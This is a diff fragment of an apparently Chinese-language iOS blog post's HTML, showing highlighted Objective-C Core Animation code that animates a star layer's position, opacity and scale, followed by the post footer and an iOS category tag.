+<span class="line-number">23</span>
+<span class="line-number">24</span>
+<span class="line-number">25</span>
+<span class="line-number">26</span>
+<span class="line-number">27</span>
+<span class="line-number">28</span>
+<span class="line-number">29</span>
+<span class="line-number">30</span>
+<span class="line-number">31</span>
+<span class="line-number">32</span>
+<span class="line-number">33</span>
+<span class="line-number">34</span>
+<span class="line-number">35</span>
+<span class="line-number">36</span>
+<span class="line-number">37</span>
+<span class="line-number">38</span>
+<span class="line-number">39</span>
+<span class="line-number">40</span>
+<span class="line-number">41</span>
+<span class="line-number">42</span>
+<span class="line-number">43</span>
+<span class="line-number">44</span>
+<span class="line-number">45</span>
+<span class="line-number">46</span>
+</pre></td><td class="code"><pre><code class="objc"><span class="line">    <span class="c1">//执行事件</span>
+</span><span class="line">    <span class="n">CAKeyframeAnimation</span> <span class="o">*</span><span class="n">positionAnimation</span> <span class="o">=</span> <span class="p">[</span><span class="n">CAKeyframeAnimation</span> <span class="n">animation</span><span class="p">];</span>
+</span><span class="line">    <span class="n">positionAnimation</span><span class="p">.</span><span class="n">keyPath</span> <span class="o">=</span> <span class="s">@&quot;position&quot;</span><span class="p">;</span>
+</span><span class="line">    <span class="n">positionAnimation</span><span class="p">.</span><span class="n">values</span> <span class="o">=</span> <span class="err">@</span><span class="p">[[</span><span class="n">NSValue</span> <span class="nl">valueWithCGPoint:</span><span class="n">CGPointMake</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">)],</span> <span class="p">[</span><span class="n">NSValue</span> <span class="nl">valueWithCGPoint:</span><span class="n">CGPointMake</span><span class="p">(</span><span class="o">-</span><span class="mi">110</span><span class="p">,</span> <span class="mi">73</span><span class="p">)],</span> <span class="p">[</span><span class="n">NSValue</span> <span class="nl">valueWithCGPoint:</span><span class="n">CGPointMake</span><span class="p">(</span><span class="o">-</span><span class="mi">167</span><span class="p">,</span> <span class="mi">116</span><span class="p">)],</span> <span class="p">[</span><span class="n">NSValue</span> <span class="nl">valueWithCGPoint:</span><span class="n">CGPointMake</span><span class="p">(</span><span class="o">-</span><span class="mi">189</span><span class="o">-</span><span class="mi">30</span><span class="p">,</span> <span class="mi">133</span><span class="o">+</span><span class="mi">30</span><span class="p">)]];</span>
+</span><span class="line">    <span class="n">positionAnimation</span><span class="p">.</span><span class="n">keyTimes</span> <span class="o">=</span> <span class="err">@</span><span class="p">[</span> <span class="err">@</span><span class="mi">0</span><span class="p">,</span> <span class="err">@</span><span class="p">(</span><span class="mi">11</span> <span class="o">/</span> <span class="mf">30.0</span><span class="p">),</span> <span class="err">@</span><span class="p">(</span><span class="mi">22</span> <span class="o">/</span> <span class="mf">30.0</span><span class="p">),</span> <span class="err">@</span><span class="mi">1</span><span class="p">];</span>
+</span><span class="line">    <span class="n">positionAnimation</span><span class="p">.</span><span class="n">duration</span> <span class="o">=</span> <span class="mf">3.0</span><span class="p">;</span>
+</span><span class="line">    <span class="n">positionAnimation</span><span class="p">.</span><span class="n">removedOnCompletion</span> <span class="o">=</span> <span class="n">NO</span><span class="p">;</span>
+</span><span class="line">    <span class="n">positionAnimation</span><span class="p">.</span><span class="n">additive</span> <span class="o">=</span> <span class="n">YES</span><span class="p">;</span>
+</span><span class="line">
+</span><span class="line">    <span class="n">positionAnimation</span><span class="p">.</span><span class="n">timingFunctions</span> <span class="o">=</span> <span class="err">@</span><span class="p">[[</span><span class="n">CAMediaTimingFunction</span> <span class="nl">functionWithName:</span><span class="n">kCAMediaTimingFunctionLinear</span><span class="p">],</span> <span class="p">[</span><span class="n">CAMediaTimingFunction</span> <span class="nl">functionWithName:</span><span class="n">kCAMediaTimingFunctionLinear</span><span class="p">],</span> <span class="p">[</span><span class="n">CAMediaTimingFunction</span> <span class="nl">functionWithName:</span><span class="n">kCAMediaTimingFunctionLinear</span><span class="p">],</span> <span class="p">[</span><span class="n">CAMediaTimingFunction</span> <span class="nl">functionWithName:</span><span class="n">kCAMediaTimingFunctionLinear</span><span class="p">]];</span>
+</span><span class="line">
+</span><span class="line">    <span class="n">positionAnimation</span><span class="p">.</span><span class="n">autoreverses</span> <span class="o">=</span> <span class="n">YES</span><span class="p">;</span>
+</span><span class="line">    <span class="n">positionAnimation</span><span class="p">.</span><span class="n">calculationMode</span> <span class="o">=</span> <span class="n">kCAAnimationLinear</span><span class="p">;</span>
+</span><span class="line">
+</span><span class="line">    <span class="p">[</span><span class="n">_meteroStar</span><span class="p">.</span><span class="n">layer</span> <span class="nl">addAnimation:</span><span class="n">positionAnimation</span> <span class="nl">forKey:</span><span class="s">@&quot;PositionAnimation&quot;</span><span class="p">];</span>
+</span><span class="line">
+</span><span class="line">    <span class="c1">//    Alpha</span>
+</span><span class="line">    <span class="n">CAKeyframeAnimation</span> <span class="o">*</span><span class="n">alphaAnimation</span> <span class="o">=</span> <span class="p">[</span><span class="n">CAKeyframeAnimation</span> <span class="nl">animationWithKeyPath:</span><span class="s">@&quot;opacity&quot;</span><span class="p">];</span>
+</span><span class="line">    <span class="n">alphaAnimation</span><span class="p">.</span><span class="n">duration</span> <span class="o">=</span> <span class="mf">3.0</span><span class="p">;</span>
+</span><span class="line">    <span class="n">alphaAnimation</span><span class="p">.</span><span class="n">values</span> <span class="o">=</span> <span class="err">@</span><span class="p">[</span> <span class="err">@</span><span class="mf">0.0</span><span class="p">,</span> <span class="err">@</span><span class="mf">1.0</span><span class="p">,</span> <span class="err">@</span><span class="mf">0.5</span><span class="p">,</span> <span class="err">@</span><span class="mf">0.4</span><span class="p">];</span>
+</span><span class="line">    <span class="n">alphaAnimation</span><span class="p">.</span><span class="n">keyTimes</span> <span class="o">=</span> <span class="err">@</span><span class="p">[</span> <span class="err">@</span><span class="mi">0</span><span class="p">,</span> <span class="err">@</span><span class="p">(</span><span class="mi">11</span> <span class="o">/</span> <span class="mf">30.0</span><span class="p">),</span> <span class="err">@</span><span class="p">(</span><span class="mi">22</span> <span class="o">/</span> <span class="mf">30.0</span><span class="p">),</span> <span class="err">@</span><span class="mi">1</span><span class="p">];</span>
+</span><span class="line">    <span class="n">alphaAnimation</span><span class="p">.</span><span class="n">autoreverses</span> <span class="o">=</span> <span class="n">NO</span><span class="p">;</span>
+</span><span class="line">    <span class="n">alphaAnimation</span><span class="p">.</span><span class="n">removedOnCompletion</span> <span class="o">=</span> <span class="n">NO</span><span class="p">;</span>
+</span><span class="line">    <span class="p">[</span><span class="n">_meteroStar</span><span class="p">.</span><span class="n">layer</span> <span class="nl">addAnimation:</span><span class="n">alphaAnimation</span> <span class="nl">forKey:</span><span class="s">@&quot;alphaPositionAnimation&quot;</span><span class="p">];</span>
+</span><span class="line">
+</span><span class="line">    <span class="c1">// Transform</span>
+</span><span class="line">    <span class="n">CAKeyframeAnimation</span> <span class="o">*</span><span class="n">animation</span> <span class="o">=</span> <span class="p">[</span><span class="n">CAKeyframeAnimation</span> <span class="nl">animationWithKeyPath:</span><span class="s">@&quot;transform&quot;</span><span class="p">];</span>
+</span><span class="line">         <span class="n">CATransform3D</span> <span class="n">scale1</span> <span class="o">=</span> <span class="n">CATransform3DMakeScale</span><span class="p">(</span><span class="mf">0.4</span><span class="p">,</span> <span class="mf">0.4</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
+</span><span class="line">         <span class="n">CATransform3D</span> <span class="n">scale2</span> <span class="o">=</span> <span class="n">CATransform3DMakeScale</span><span class="p">(</span><span class="mf">1.2</span><span class="p">,</span> <span class="mf">1.2</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
+</span><span class="line">         <span class="n">CATransform3D</span> <span class="n">scale3</span> <span class="o">=</span> <span class="n">CATransform3DMakeScale</span><span class="p">(</span><span class="mf">0.9</span><span class="p">,</span> <span class="mf">0.9</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
+</span><span class="line">         <span class="n">CATransform3D</span> <span class="n">scale4</span> <span class="o">=</span> <span class="n">CATransform3DMakeScale</span><span class="p">(</span><span class="mf">0.4</span><span class="p">,</span> <span class="mf">0.4</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
+</span><span class="line">
+</span><span class="line">    <span class="n">NSArray</span> <span class="o">*</span><span class="n">frameValues</span> <span class="o">=</span> <span class="p">[</span><span class="n">NSArray</span> <span class="nl">arrayWithObjects:</span>
+</span><span class="line">                                  <span class="p">[</span><span class="n">NSValue</span> <span class="nl">valueWithCATransform3D:</span><span class="n">scale1</span><span class="p">],</span>
+</span><span class="line">                                  <span class="p">[</span><span class="n">NSValue</span> <span class="nl">valueWithCATransform3D:</span><span class="n">scale2</span><span class="p">],</span>
+</span><span class="line">                                  <span class="p">[</span><span class="n">NSValue</span> <span class="nl">valueWithCATransform3D:</span><span class="n">scale3</span><span class="p">],</span>
+</span><span class="line">                                  <span class="p">[</span><span class="n">NSValue</span> <span class="nl">valueWithCATransform3D:</span><span class="n">scale4</span><span class="p">],</span>
+</span><span class="line">                                                               <span class="nb">nil</span><span class="p">];</span>
+</span><span class="line">    <span class="p">[</span><span class="n">animation</span> <span class="nl">setValues:</span><span class="n">frameValues</span><span class="p">];</span>
+</span><span class="line">
+</span><span class="line">    <span class="n">animation</span><span class="p">.</span><span class="n">keyTimes</span> <span class="o">=</span> <span class="err">@</span><span class="p">[</span> <span class="err">@</span><span class="mi">0</span><span class="p">,</span> <span class="err">@</span><span class="p">(</span><span class="mi">11</span> <span class="o">/</span> <span class="mf">30.0</span><span class="p">),</span> <span class="err">@</span><span class="p">(</span><span class="mi">22</span> <span class="o">/</span> <span class="mf">30.0</span><span class="p">),</span> <span class="err">@</span><span class="mi">1</span><span class="p">];</span>
+</span><span class="line">    <span class="n">animation</span><span class="p">.</span><span class="n">fillMode</span> <span class="o">=</span> <span class="n">kCAFillModeForwards</span><span class="p">;</span>
+</span><span class="line">    <span class="n">animation</span><span class="p">.</span><span class="n">duration</span> <span class="o">=</span> <span class="mi">3</span><span class="p">;</span>
+</span><span class="line">    <span class="n">animation</span><span class="p">.</span><span class="n">autoreverses</span> <span class="o">=</span> <span class="n">NO</span><span class="p">;</span>
+</span><span class="line">    <span class="n">animation</span><span class="p">.</span><span class="n">removedOnCompletion</span> <span class="o">=</span> <span class="n">NO</span><span class="p">;</span>
+</span><span class="line">    <span class="p">[</span><span class="n">self</span><span class="p">.</span><span class="n">meteroStar</span><span class="p">.</span><span class="n">layer</span> <span class="nl">addAnimation:</span><span class="n">animation</span> <span class="nl">forKey:</span><span class="s">@&quot;PopUpAnimation&quot;</span><span class="p">];</span>
+</span></code></pre></td></tr></table></div></figure></notextile></div>
+
+</p>
+<p class="post-footer">
+                        written by <a href="http://ITMonkeyLife.github.io/Blog">Rick</a>&nbsp;posted at <a href="http://ITMonkeyLife.github.io/Blog">http://ITMonkeyLife.github.io/Blog</a></p>
+
+		
+		
+	</div>
+
+
+<div class="meta">
+	<div class="date">
+
+
+
+
+</div>
+	<div class="tags">
+
+
+	<a class='category' href='/Blog/blog/categories/ios/'>iOS</a>
+
+
+</div>
+	
+	<div class="comments"><a href="/Blog/blog/2016/06/12/dong-hua-xiang-jie/#disqus_thread">Comments</a></div>
 	
 </div>
 </article>
